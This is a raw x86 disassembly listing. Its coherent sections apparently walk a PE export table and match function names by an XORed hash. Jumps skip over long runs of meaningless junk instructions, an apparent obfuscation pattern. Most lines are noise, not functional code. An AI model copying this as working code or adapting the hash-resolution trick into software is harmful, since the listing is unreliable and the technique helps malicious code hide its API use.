  411c11:	mov    DWORD PTR ds:0x4345cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	out    0x15,eax
  411c73:	pop    ecx
  411c74:	clc    
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411cfd
  411c7e:	add    DWORD PTR [edx-0x31],0xac9301e0
  411c85:	push   ds
  411c86:	jo     0x411c62
  411c88:	inc    eax
  411c89:	xchg   edi,eax
  411c8a:	scas   al,BYTE PTR es:[edi]
  411c8b:	and    al,0xb2
  411c8d:	cmp    DWORD PTR [edx-0x26cadd8c],esp
  411c93:	dec    ecx
  411c94:	call   FWORD PTR ds:0xbc300720
  411c9a:	mov    BYTE PTR [edi+edx*1],al
  411c9d:	pop    ecx
  411c9e:	ret    0xcbc8
  411ca1:	cdq    
  411ca2:	(bad)  
  411ca3:	mov    al,ds:0x2dafbd84
  411ca8:	and    dl,BYTE PTR [ecx+ebx*8-0x62]
  411cac:	call   esi
  411cae:	xor    al,0x2
  411cb0:	mov    eax,ds:0x5780abcc
  411cb5:	mov    cl,0xb7
  411cb7:	xor    DWORD PTR [ebx],ebx
  411cb9:	mov    WORD PTR [ecx+0x7b27695],ds
  411cbf:	out    dx,eax
  411cc0:	dec    ebx
  411cc1:	mov    esi,0x41d3f95c
  411cc6:	mov    ch,0xab
  411cc8:	in     eax,dx
  411cc9:	popf   
  411cca:	rol    DWORD PTR [esi-0x7d],cl
  411ccd:	arpl   WORD PTR fs:[edi],cx
  411cd0:	imul   di,WORD PTR [ebp-0x1dde9a5],0x7da8
  411cd9:	and    dl,BYTE PTR [edx]
  411cdb:	xor    BYTE PTR [eax],dl
  411cdd:	sbb    bl,0xc8
  411ce0:	jb     0x411c62
  411ce2:	gs hlt 
  411ce4:	jns    0x411c7d
  411ce6:	lods   al,BYTE PTR ds:[esi]
  411ce7:	int3   
  411ce8:	mov    dl,0x4f
  411cea:	cmp    ah,ch
  411cec:	or     ch,BYTE PTR [ebx-0x53]
  411cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cf0:	mov    cl,dl
  411cf2:	sar    DWORD PTR [esi],0xc4
  411cf5:	ret    
  411cf6:	mov    ah,0xac
  411cf8:	sbb    BYTE PTR [ecx],al
  411cfa:	int3   
  411cfb:	xor    eax,0x4b2bdcbc
  411d00:	mov    ebp,DWORD PTR [ecx-0x60]
  411d03:	or     eax,0x330534ab
  411d08:	mov    cl,0x3d
  411d0a:	idiv   BYTE PTR [ebp-0x6]
  411d0d:	add    dh,BYTE PTR [esi+0x67]
  411d10:	xchg   BYTE PTR [edx-0x5ab62bb3],bl
  411d16:	fld    TBYTE PTR [eax]
  411d18:	push   ds
  411d19:	icebp  
  411d1a:	test   BYTE PTR [esi-0x3eafcedf],dh
  411d20:	stc    
  411d21:	lods   al,BYTE PTR ds:[esi]
  411d22:	sub    esp,DWORD PTR [eax-0x34e082ec]
  411d28:	push   ds
  411d29:	jecxz  0x411d0e
  411d2b:	xor    edx,ebx
  411d2d:	xchg   esp,eax
  411d2e:	retf   
  411d2f:	fs pop edi
  411d31:	adc    eax,0xf54816a7
  411d36:	push   ecx
  411d37:	sbb    eax,0x71198a21
  411d3c:	jmp    0x411d87
  411d3e:	xchg   BYTE PTR ds:0xde08eba2,ah
  411d44:	mov    al,0xf3
  411d46:	daa    
  411d47:	call   0x3f08:0xeb4e3cd6
  411d4e:	popf   
  411d4f:	ins    BYTE PTR es:[edi],dx
  411d50:	cdq    
  411d51:	dec    esi
  411d52:	ret    
  411d53:	outs   dx,DWORD PTR ds:[esi]
  411d54:	dec    esp
  411d55:	xor    eax,0x4940175e
  411d5a:	sahf   
  411d5b:	sbb    cl,BYTE PTR [edi+0x4108a581]
  411d61:	ror    BYTE PTR [edi+0x1b8d1923],1
  411d67:	add    eax,0x4e3f28e8
  411d6c:	mov    bh,0xf7
  411d6e:	lods   eax,DWORD PTR ds:[esi]
  411d6f:	and    dl,BYTE PTR [eax-0x7f]
  411d72:	ret    0x127f
  411d75:	loope  0x411d97
  411d77:	xlat   BYTE PTR ds:[ebx]
  411d78:	mov    eax,0x3dafc47e
  411d7d:	jbe    0x411d26
  411d7f:	add    BYTE PTR [eax],bl
  411d81:	hlt    
  411d82:	mov    ebp,0xf46c6ead
  411d87:	push   edx
  411d88:	outs   dx,BYTE PTR ds:[esi]
  411d89:	adc    eax,0x9869cb69
  411d8e:	xor    eax,0xf73a39bb
  411d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d94:	lds    esi,FWORD PTR [ebp+0x158d31c4]
  411d9a:	xchg   DWORD PTR [edx+0x5c],ebx
  411d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9e:	xor    eax,0xee7b9bef
  411da3:	stos   DWORD PTR es:[edi],eax
  411da4:	xchg   esi,eax
  411da5:	jmp    0xcda71934
  411daa:	shl    BYTE PTR [ecx-0x7660dfa9],1
  411db0:	xchg   ecx,eax
  411db1:	jns    0x411e2a
  411db3:	or     DWORD PTR [eax+0x33],eax
  411db6:	inc    eax
  411db7:	or     eax,0xded4d3fb
  411dbc:	pop    ds
  411dbd:	pop    ebp
  411dbe:	inc    esp
  411dbf:	test   eax,0x42d17ca8
  411dc4:	push   0xfd81d89f
  411dc9:	mov    al,0xfb
  411dcb:	mov    ch,bh
  411dcd:	dec    ecx
  411dce:	shl    DWORD PTR [edi+edx*8],cl
  411dd1:	lods   eax,DWORD PTR ds:[esi]
  411dd2:	mov    bh,0xc0
  411dd4:	int3   
  411dd5:	xchg   edx,eax
  411dd6:	mov    esp,DWORD PTR [ebx+0x33]
  411dd9:	sub    DWORD PTR [esi-0x36e83e5f],edi
  411ddf:	mov    bh,0x1
  411de1:	pop    esp
  411de2:	into   
  411de3:	idiv   DWORD PTR [ecx]
  411de5:	or     eax,0x90dbba22
  411dea:	inc    eax
  411deb:	dec    DWORD PTR [edi]
  411ded:	lods   al,BYTE PTR ds:[esi]
  411dee:	enter  0xd717,0xda
  411df2:	dec    ebx
  411df3:	mov    ds:0xdeb9e320,al
  411df8:	dec    esi
  411df9:	inc    esi
  411dfa:	shr    BYTE PTR [eax+0xac8d0cb],cl
  411e00:	add    BYTE PTR [esi-0x12e75fb7],ah
  411e06:	(bad)  
  411e07:	and    ebx,DWORD PTR [ebp-0x3b]
  411e0a:	mov    edx,0xc042d072
  411e0f:	jg     0x411e64
  411e11:	mov    edi,0x1079658
  411e16:	arpl   WORD PTR [ebx-0x74c0b253],di
  411e1c:	mov    dh,0x85
  411e1e:	das    
  411e1f:	in     eax,dx
  411e20:	(bad)  
  411e21:	rcl    DWORD PTR [edx-0x27],0x36
  411e25:	jmp    0xc3eca58e
  411e2a:	mov    dh,BYTE PTR [edi+0x7]
  411e2d:	call   esp
  411e2f:	call   0x5fee:0xc45abda6
  411e36:	aas    
  411e37:	setne  BYTE PTR [esi+0x2491e385]
  411e3e:	mov    WORD PTR [esi+0x71],gs
  411e41:	sub    DWORD PTR [esi],ebx
  411e43:	mov    WORD PTR [edi+0x5c4ff4c2],es
  411e49:	jns    0x411e08
  411e4b:	mov    BYTE PTR [ebx+ebp*4+0x25e7d934],0x21
  411e53:	and    bh,BYTE PTR [ebx]
  411e55:	cmp    al,0xa1
  411e57:	mov    eax,0xb0ada575
  411e5c:	ins    DWORD PTR es:[edi],dx
  411e5d:	or     edi,esp
  411e5f:	popf   
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	xchg   BYTE PTR ds:0x50300db4,bl
  411ec5:	jle    0x411f45
  411ec7:	pop    ecx
  411ec8:	jg     0x411f48
  411eca:	jle    0x411ee1
  411ecc:	and    al,0x88
  411ece:	imul   edx,DWORD PTR [esi+0x46e877d5],0xf99bce9c
  411ed8:	cmp    BYTE PTR [edi],ah
  411eda:	sub    DWORD PTR [edi+0x7cb413c6],esp
  411ee0:	scas   al,BYTE PTR es:[edi]
  411ee1:	call   0x6197:0xff6958ce
  411ee8:	ror    esp,cl
  411eea:	scas   eax,DWORD PTR es:[edi]
  411eeb:	fisttp QWORD PTR [ebp+0x37]
  411eee:	addr16 sub ecx,ebx
  411ef1:	in     al,0xf2
  411ef3:	fidiv  WORD PTR [ecx-0x4e84ca8f]
  411ef9:	in     al,dx
  411efa:	pop    esp
  411efb:	sbb    edx,DWORD PTR [ebx+edx*8]
  411efe:	fcom   DWORD PTR [esi*8+0x4b9f2125]
  411f05:	mov    ebp,0x92b470d2
  411f0a:	cmp    al,0xad
  411f0c:	pop    eax
  411f0d:	add    al,0x8b
  411f0f:	mov    al,0x5
  411f11:	cmp    eax,0x3bda70f4
  411f16:	mov    eax,ds:0x6e877b9c
  411f1b:	aaa    
  411f1c:	jnp    0x411ef6
  411f1e:	add    DWORD PTR [edx],edx
  411f20:	scas   al,BYTE PTR es:[edi]
  411f21:	stos   DWORD PTR es:[edi],eax
  411f22:	and    al,0xdb
  411f24:	inc    esi
  411f25:	(bad)  
  411f26:	outs   dx,DWORD PTR ds:[esi]
  411f27:	rcr    BYTE PTR [eax],1
  411f29:	retf   0x551a
  411f2c:	push   edi
  411f2d:	rol    DWORD PTR [esi+0x3251710e],0x48
  411f34:	test   eax,0x94d8c5eb
  411f39:	ss fcmovbe st,st(7)
  411f3c:	aaa    
  411f3d:	dec    ebx
  411f3e:	pop    edi
  411f3f:	push   0xd9c76c0b
  411f44:	or     al,0x19
  411f46:	lds    esi,FWORD PTR [edi+edi*8]
  411f49:	nop
  411f4a:	mov    esp,es
  411f4c:	scas   eax,DWORD PTR es:[edi]
  411f4d:	jmp    0xf62726f5
  411f52:	sahf   
  411f53:	mov    edi,edx
  411f55:	aaa    
  411f56:	and    BYTE PTR [ebp-0x235c37e8],ah
  411f5c:	ins    DWORD PTR es:[edi],dx
  411f5d:	fist   DWORD PTR [ebx-0x21]
  411f60:	shl    BYTE PTR [edi-0x4f601887],0x2c
  411f67:	add    ecx,DWORD PTR [ebx]
  411f69:	cwde   
  411f6a:	in     eax,0x46
  411f6c:	mov    dl,0xcf
  411f6e:	mov    al,ds:0x6da7eb74
  411f73:	mov    ?,WORD PTR [esi-0x76d0e45]
  411f79:	lods   al,BYTE PTR ds:[esi]
  411f7a:	xchg   esi,eax
  411f7b:	fcomp  DWORD PTR [esi]
  411f7d:	outs   dx,DWORD PTR ds:[esi]
  411f7e:	jecxz  0x411f3b
  411f80:	imul   esi,edx,0xffffffa7
  411f83:	repnz lds esi,FWORD PTR [ecx+0x35dc70c0]
  411f8a:	mov    esi,0x87964313
  411f8f:	xor    BYTE PTR [ebp-0x7f],0xa6
  411f93:	jbe    0x411f32
  411f95:	mov    ds:0xf1a7a1f1,eax
  411f9a:	sbb    BYTE PTR [edx-0x67],ah
  411f9d:	scas   al,BYTE PTR es:[edi]
  411f9e:	jo     0x411f3c
  411fa0:	outs   dx,BYTE PTR ds:[esi]
  411fa1:	push   cs
  411fa2:	loopne 0x411f42
  411fa4:	or     BYTE PTR [esi+0x4],0x19
  411fa8:	mov    cl,0xaf
  411faa:	jne    0x411f65
  411fac:	bound  edi,QWORD PTR [ecx]
  411fae:	xchg   edi,eax
  411faf:	mov    ds:0x34f52328,al
  411fb4:	or     ah,cl
  411fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb7:	inc    esp
  411fb8:	mov    ebx,0x8ced38c8
  411fbd:	cmp    bh,BYTE PTR [ebp+0x7796182e]
  411fc3:	outs   dx,BYTE PTR ds:[esi]
  411fc4:	jmp    0xafb:0xa8d72e6e
  411fcb:	sbb    ebx,DWORD PTR [ebp+ebp*2-0x600f6ee1]
  411fd2:	fldcw  WORD PTR [edx-0x64]
  411fd5:	outs   dx,DWORD PTR ds:[esi]
  411fd6:	out    dx,eax
  411fd7:	hlt    
  411fd8:	ins    DWORD PTR es:[edi],dx
  411fd9:	sbb    al,dl
  411fdb:	mov    ebp,0x7364b636
  411fe0:	in     al,0xf5
  411fe2:	push   es
  411fe3:	mov    BYTE PTR [eax],ah
  411fe5:	std    
  411fe6:	loope  0x411fa4
  411fe8:	and    DWORD PTR [edi-0x7d3e3596],edx
  411fee:	aaa    
  411fef:	loop   0x411fd8
  411ff1:	jge    0x411fc1
  411ff3:	push   DWORD PTR [ebx+0x31]
  411ff6:	popa   
  411ff7:	pop    ebx
  411ff8:	dec    BYTE PTR [edi+edx*2]
  411ffb:	ins    BYTE PTR es:[edi],dx
  411ffc:	cs inc ebp
  411ffe:	cli    
  411fff:	stos   DWORD PTR es:[edi],eax
  412000:	mov    eax,0xbe5b4f40
  412005:	xor    ecx,esp
  412007:	jb     0x411fd6
  412009:	add    eax,0xe31da1c
  41200e:	adc    bl,BYTE PTR [esi-0x6a]
  412011:	inc    ecx
  412012:	fnstsw WORD PTR [edi+ebp*8+0x22e2b85c]
  412019:	push   ebp
  41201a:	jmp    0x412007
  41201c:	push   eax
  41201d:	inc    ebp
  41201e:	pop    ebx
  41201f:	fld    st(3)
  412021:	out    0x7e,al
  412023:	test   BYTE PTR [eax-0x379a6d7e],ah
  412029:	test   eax,0xfdd59885
  41202e:	in     eax,dx
  41202f:	adc    al,0x57
  412031:	fnstsw WORD PTR [ebx]
  412033:	in     al,dx
  412034:	mov    ecx,ebx
  412036:	retf   0xc6e8
  412039:	lahf   
  41203a:	mov    al,ds:0x94a85bc6
  41203f:	out    dx,al
  412040:	cmp    al,0x6
  412042:	lock mov edx,0x5c01cbdc
  412048:	lahf   
  412049:	dec    dh
  41204b:	add    bl,BYTE PTR [esi+0x423478bc]
  412051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412052:	push   ss
  412053:	and    al,0xee
  412055:	and    BYTE PTR [ecx+0x68],cl
  412058:	ds dec ecx
  41205a:	xchg   esi,eax
  41205b:	push   ds
  41205c:	shufps xmm6,XMMWORD PTR [edx-0x69],0x64
  412061:	and    al,0xa4
  412063:	push   eax
  412064:	lds    eax,FWORD PTR [esp+ebx*8+0x69]
  412068:	jbe    0x412087
  41206a:	mov    edi,0xd1fea17
  41206f:	mov    eax,0x8d6d333b
  412074:	push   edi
  412075:	rcr    cl,0xa2
  412078:	xor    al,0x58
  41207a:	push   0x6b9f4c7b
  41207f:	xchg   esp,eax
  412080:	or     BYTE PTR [edi],0x91
  412083:	ret    
  412084:	xor    esp,eax
  412086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412087:	aam    0x55
  412089:	(bad)  
  41208a:	cld    
  41208b:	fcomip st,st(5)
  41208d:	xchg   ebx,eax
  41208e:	xchg   edx,eax
  41208f:	(bad)  
  412090:	and    edx,DWORD PTR [edi]
  412092:	ror    BYTE PTR [ecx+edx*1],0xf
  412096:	and    bh,BYTE PTR [ebx]
  412098:	stos   BYTE PTR es:[edi],al
  412099:	add    eax,0x26b44971
  41209e:	jbe    0x412043
  4120a0:	cdq    
  4120a1:	pushf  
  4120a2:	jp     0x41202a
  4120a4:	pop    edi
  4120a5:	sub    dl,ch
  4120a7:	mov    al,ds:0x2fd315fa
  4120ac:	ds enter 0x4d8b,0xec
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	mov    ebp,0x13f274e5
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x412136
  4120d2:	shufps xmm7,XMMWORD PTR [ebp+edi*8-0x37],0x2b
  4120d8:	ja     0x412143
  4120da:	ds jmp 0x15a3:0x8996134c
  4120e2:	icebp  
  4120e3:	cmp    DWORD PTR [edi-0x34],edx
  4120e6:	jae    0x41206f
  4120e8:	mov    BYTE PTR [edx+edi*2],bl
  4120eb:	inc    ecx
  4120ec:	mov    edi,0xfb8246f
  4120f1:	rcr    DWORD PTR [ebp+0x602531cf],cl
  4120f7:	pop    ebx
  4120f8:	and    bl,ah
  4120fa:	(bad)  [esi+esi*2-0x66]
  4120fe:	xchg   cl,al
  412100:	dec    ebp
  412101:	jle    0x41211f
  412103:	pop    eax
  412104:	jbe    0x41215c
  412106:	inc    eax
  412107:	js     0x4120c8
  412109:	or     al,0x22
  41210b:	sub    ecx,DWORD PTR [ebx-0x7d]
  41210e:	fdiv   st(5),st
  412110:	into   
  412111:	jns    0x4120e6
  412113:	aam    0xca
  412115:	lds    ebx,FWORD PTR [ecx+0x601d3cec]
  41211b:	sbb    eax,esi
  41211d:	ds inc esp
  41211f:	stos   BYTE PTR es:[edi],al
  412120:	pusha  
  412121:	xor    al,0x45
  412123:	sbb    BYTE PTR [edx],0x33
  412126:	jno    0x412116
  412128:	jp     0x412100
  41212a:	jbe    0x41210a
  41212c:	das    
  41212d:	call   edx
  41212f:	mov    esi,0x697cd13b
  412134:	jno    0x412111
  412136:	fbstp  TBYTE PTR [edi+0x68]
  412139:	push   ds
  41213a:	xor    BYTE PTR [ecx],dh
  41213c:	push   cs
  41213d:	pop    edi
  41213e:	push   eax
  41213f:	pop    edx
  412140:	mov    ss,ecx
  412142:	leave  
  412143:	not    DWORD PTR [eax+0x78233968]
  412149:	(bad)  
  41214a:	fimul  DWORD PTR ss:[ebx+ebp*1]
  41214e:	test   eax,0xdd7f450b
  412153:	xor    DWORD PTR [ebx-0x473dcd83],ebx
  412159:	enter  0x494,0x4d
  41215d:	daa    
  41215e:	inc    edx
  41215f:	imul   ecx,DWORD PTR [ebx-0x64],0x37ae59c2
  412166:	xchg   esi,eax
  412167:	mov    ecx,0x368f1733
  41216c:	xor    eax,0x69f237b5
  412171:	xor    esp,DWORD PTR [edx]
  412173:	mov    cl,0xe4
  412175:	mov    cl,0xf0
  412177:	ret    
  412178:	scas   al,BYTE PTR es:[edi]
  412179:	rcr    edx,1
  41217b:	push   edx
  41217c:	pop    eax
  41217d:	xor    eax,0x3e686845
  412182:	pop    ss
  412183:	dec    edx
  412184:	outs   dx,DWORD PTR ds:[esi]
  412185:	push   ebp
  412186:	jbe    0x412120
  412188:	cmp    esp,ebp
  41218a:	push   ecx
  41218b:	pop    es
  41218c:	and    eax,0xd3082afc
  412191:	out    dx,al
  412192:	add    ebp,DWORD PTR [edx+0xe118972]
  412198:	sub    eax,0x1f76261e
  41219d:	xor    eax,0x89dff006
  4121a2:	fs inc esi
  4121a4:	aas    
  4121a5:	mov    cl,0x47
  4121a7:	mov    dl,0x63
  4121a9:	lahf   
  4121aa:	in     al,0xab
  4121ac:	inc    ebp
  4121ad:	ret    
  4121ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121af:	jb     0x4121fa
  4121b1:	cmp    DWORD PTR [eax],edi
  4121b3:	xlat   BYTE PTR ds:[ebx]
  4121b4:	mov    WORD PTR cs:[edi],ds
  4121b7:	mov    esp,0xd6ec7a0d
  4121bc:	call   0x6661:0x67d8f541
  4121c3:	mov    al,ds:0x79cbf3be
  4121c8:	lds    ebx,FWORD PTR ds:0x33498022
  4121ce:	out    0x55,al
  4121d0:	rol    DWORD PTR [edx+0x60],cl
  4121d3:	scas   al,BYTE PTR es:[edi]
  4121d4:	mov    bh,BYTE PTR [esi]
  4121d6:	or     esp,edx
  4121d8:	push   es
  4121d9:	or     al,0x5b
  4121db:	and    bl,BYTE PTR [ebx-0x62]
  4121de:	(bad)
  4121e1:	popf   
  4121e2:	hlt    
  4121e3:	call   0xd73cdfb6
  4121e8:	adc    edx,DWORD PTR [ebx+0x72]
  4121eb:	xor    al,0xbb
  4121ed:	jae    0x41221f
  4121ef:	test   eax,0x89f7a3b2
  4121f4:	or     al,BYTE PTR [edx-0x4a2f04ee]
  4121fa:	sbb    DWORD PTR [eax+ebp*4+0x2ef75c0f],0xb6264e20
  412205:	or     cl,BYTE PTR ds:0x2a21f2a0
  41220b:	scas   eax,DWORD PTR es:[edi]
  41220c:	or     ch,BYTE PTR [edi-0x9]
  41220f:	fstp   DWORD PTR [esi+0x6bbc7186]
  412215:	hlt    
  412216:	jne    0x41219f
  412218:	int    0x59
  41221a:	add    cl,bl
  41221c:	pop    esp
  41221d:	xlat   BYTE PTR ds:[ebx]
  41221e:	mov    ch,0x2
  412220:	adc    DWORD PTR [ebx-0x619afb35],0xffffffa1
  412227:	jge    0x41229e
  412229:	out    dx,eax
  41222a:	pop    ebp
  41222b:	int    0x1a
  41222d:	int    0xd3
  41222f:	mov    eax,0x56d170c2
  412234:	dec    ebp
  412235:	add    BYTE PTR [ebx+0x50],ah
  412238:	add    BYTE PTR ds:0xc712dedb,cl
  41223e:	and    BYTE PTR [ecx-0x76],cl
  412241:	gs jb  0x412292
  412244:	cmp    DWORD PTR [ebx],ebp
  412246:	out    0xa2,eax
  412248:	mov    ds:0xcb0392dd,eax
  41224d:	std    
  41224e:	mov    cl,0x31
  412250:	xchg   edx,eax
  412251:	push   ds
  412252:	sar    BYTE PTR [ebp-0x2ad4b6a1],cl
  412258:	and    al,0x40
  41225a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225b:	mov    bh,0x1d
  41225d:	and    eax,0x4ef53d7e
  412262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412263:	jb     0x41225e
  412265:	xor    eax,0x5083bd8a
  41226a:	jmp    0x9e2ef973
  41226f:	call   0xf00:0xc2a70a6e
  412276:	sub    al,0x2b
  412278:	xor    BYTE PTR [esi-0x1405103],bh
  41227e:	mov    DWORD PTR [ebx],edi
  412280:	mov    dh,0xd1
  412282:	jae    0x412244
  412284:	hlt    
  412285:	xor    al,0xda
  412287:	add    eax,0xd3145049
  41228c:	push   0x3dee8219
  412291:	jns    0x41228c
  412293:	into   
  412294:	or     al,0x54
  412296:	xchg   ecx,eax
  412297:	sub    eax,0x9b8ab54d
  41229c:	mov    bh,0xe9
  41229e:	fsub   DWORD PTR [eax+0x7fb99fd0]
  4122a4:	sbb    edi,esi
  4122a6:	cwde   
  4122a7:	mov    ecx,ss
  4122a9:	cmp    al,BYTE PTR [ecx-0xa]
  4122ac:	rcl    ebp,0xd3
  4122af:	std    
  4122b0:	cmp    BYTE PTR [esi+0x28],dl
  4122b3:	add    BYTE PTR [ecx+0x458b0c45],cl
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x78e913ed],ch
  4122ef:	retf   
  4122f0:	cmp    bh,BYTE PTR [esi+0x5c]
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x412281
  4122fa:	inc    edx
  4122fb:	mov    bl,0xae
  4122fd:	fwait
  4122fe:	and    al,0xfd
  412300:	adc    ebx,ebp
  412302:	cmp    eax,DWORD PTR [esi]
  412304:	or     eax,ecx
  412306:	bound  eax,QWORD PTR [ecx-0x3dfbc4cf]
  41230c:	pop    ss
  41230d:	jnp    0x4122e8
  41230f:	or     BYTE PTR [esi-0x3b],dl
  412312:	and    ah,al
  412314:	rcr    esi,1
  412316:	sar    bl,1
  412318:	push   eax
  412319:	in     al,0xe4
  41231b:	ds jae 0x41237a
  41231e:	mov    bl,0x68
  412320:	ficomp WORD PTR [edx+esi*2+0x2d]
  412324:	lods   al,BYTE PTR cs:[esi]
  412326:	push   esp
  412327:	mov    esp,0xc6e2ea5
  41232c:	arpl   WORD PTR ss:[edx+eax*1+0x5c376a34],ax
  412334:	aas    
  412335:	out    dx,al
  412336:	jno    0x41230a
  412338:	add    ecx,DWORD PTR es:[esi+0x4b]
  41233c:	(bad)  
  41233d:	or     edx,DWORD PTR [esi]
  41233f:	mov    esp,0x9ffa5d42
  412344:	add    eax,0x7dccff9d
  412349:	nop
  41234a:	xor    DWORD PTR [ebx+0x26],esp
  41234d:	mov    ch,BYTE PTR [edi]
  41234f:	dec    eax
  412350:	in     eax,0x49
  412352:	inc    edx
  412353:	jge    0x41237c
  412355:	xchg   ebp,eax
  412356:	xor    eax,0x9994c04f
  41235b:	sub    esp,ebp
  41235d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41235e:	rcr    BYTE PTR [esi],0xd8
  412361:	add    al,0x4e
  412363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412364:	mov    esp,0x1c928dad
  412369:	cmc    
  41236a:	push   0x833b695a
  41236f:	adc    DWORD PTR ds:0x5c01c667,0xffffff8d
  412376:	cld    
  412377:	jmp    0x4ce7:0x6f798e44
  41237e:	int3   
  41237f:	push   0x356f42e9
  412384:	out    0x15,eax
  412386:	push   ss
  412387:	jnp    0x4123ce
  412389:	push   ebx
  41238a:	cld    
  41238b:	mov    ecx,DWORD PTR [edx+0x39e916c7]
  412391:	jle    0x412387
  412393:	dec    eax
  412394:	jmp    0xbd7cc102
  412399:	aam    0x33
  41239b:	sub    ah,0xdc
  41239e:	aas    
  41239f:	out    dx,eax
  4123a0:	pop    es
  4123a1:	mov    ds:0x12aec0ee,al
  4123a6:	xor    ah,al
  4123a8:	jbe    0x412427
  4123aa:	int3   
  4123ab:	popa   
  4123ac:	idiv   dh
  4123ae:	jecxz  0x412391
  4123b0:	test   eax,0xa93742bf
  4123b5:	sahf   
  4123b6:	inc    ebx
  4123b7:	mul    DWORD PTR [ecx-0x46d6c3fe]
  4123bd:	push   esi
  4123be:	lahf   
  4123bf:	rol    BYTE PTR [ebx],cl
  4123c1:	dec    esp
  4123c2:	jl     0x4123af
  4123c4:	push   edi
  4123c5:	aam    0xed
  4123c7:	inc    esp
  4123c8:	outs   dx,BYTE PTR ds:[esi]
  4123c9:	xchg   DWORD PTR [eax],esi
  4123cb:	xor    eax,0xc4b8e556
  4123d0:	xchg   ebp,eax
  4123d1:	out    0x9a,eax
  4123d3:	mov    dh,ch
  4123d5:	add    esp,0x1bb261ac
  4123db:	into   
  4123dc:	push   ds
  4123dd:	push   es
  4123de:	jno    0x412372
  4123e0:	inc    ebx
  4123e1:	in     al,0x5e
  4123e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e4:	and    al,0x27
  4123e6:	sub    BYTE PTR [esi-0x1f],bl
  4123e9:	xor    dh,BYTE PTR [eax]
  4123eb:	aaa    
  4123ec:	imul   edx,DWORD PTR [esp+edx*1+0x14],0x3dd58278
  4123f4:	xchg   BYTE PTR [eax+0x65],dl
  4123f7:	sbb    dh,BYTE PTR [ebx]
  4123f9:	xchg   ebx,eax
